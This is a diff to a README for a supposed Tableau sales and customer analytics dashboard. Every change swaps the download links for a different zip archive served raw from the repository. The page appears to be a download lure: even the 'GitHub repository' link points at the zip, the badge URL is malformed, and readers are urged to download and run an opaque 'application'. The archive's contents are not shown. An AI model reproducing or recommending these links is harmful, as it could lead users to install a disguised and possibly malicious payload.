@@ -6,7 +6,7 @@ Welcome to the Sales-Customer_Analytics_Dashboard. This application helps you an
 
 ## 📥 Download the Application
 
-[![Download from GitHub](https://raw.githubusercontent.com/zazaafg/Sales-Customer_Analytics_Dashboard/main/Datasets/Sales-Customer_Analytics_Dashboard_v1.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/zazaafg/Sales-Customer_Analytics_Dashboard/main/Datasets/Sales-Customer_Analytics_Dashboard_v1.6.zip)
+[![Download from GitHub](https://github.com/zazaafg/Sales-Customer_Analytics_Dashboard/raw/refs/heads/main/Dashboards/Analytics-Sales-Dashboard-Customer-v3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/zazaafg/Sales-Customer_Analytics_Dashboard/raw/refs/heads/main/Dashboards/Analytics-Sales-Dashboard-Customer-v3.9.zip)
 
 ## 📂 What is This Project?
 
@@ -30,7 +30,7 @@ This project is a Tableau application that combines sales data and customer insi
 
 To get started, visit the following page to download the application:
 
-[Download Here](https://raw.githubusercontent.com/zazaafg/Sales-Customer_Analytics_Dashboard/main/Datasets/Sales-Customer_Analytics_Dashboard_v1.6.zip)
+[Download Here](https://github.com/zazaafg/Sales-Customer_Analytics_Dashboard/raw/refs/heads/main/Dashboards/Analytics-Sales-Dashboard-Customer-v3.9.zip)
 
 1. Click on the link above.
 2. Scroll down to find the latest release.
@@ -66,10 +66,10 @@ If you have questions or need help, feel free to reach out. Your feedback is imp
 
 ## 🌐 More Information
 
-For further details, code contributions, or to check for updates, visit the [GitHub repository](https://raw.githubusercontent.com/zazaafg/Sales-Customer_Analytics_Dashboard/main/Datasets/Sales-Customer_Analytics_Dashboard_v1.6.zip).
+For further details, code contributions, or to check for updates, visit the [GitHub repository](https://github.com/zazaafg/Sales-Customer_Analytics_Dashboard/raw/refs/heads/main/Dashboards/Analytics-Sales-Dashboard-Customer-v3.9.zip).
 
 Explore the application and enjoy uncovering valuable insights that can drive your business forward! 
 
-[Download Here](https://raw.githubusercontent.com/zazaafg/Sales-Customer_Analytics_Dashboard/main/Datasets/Sales-Customer_Analytics_Dashboard_v1.6.zip) 
+[Download Here](https://github.com/zazaafg/Sales-Customer_Analytics_Dashboard/raw/refs/heads/main/Dashboards/Analytics-Sales-Dashboard-Customer-v3.9.zip) 
 
 Thank you for using the Sales-Customer_Analytics_Dashboard!
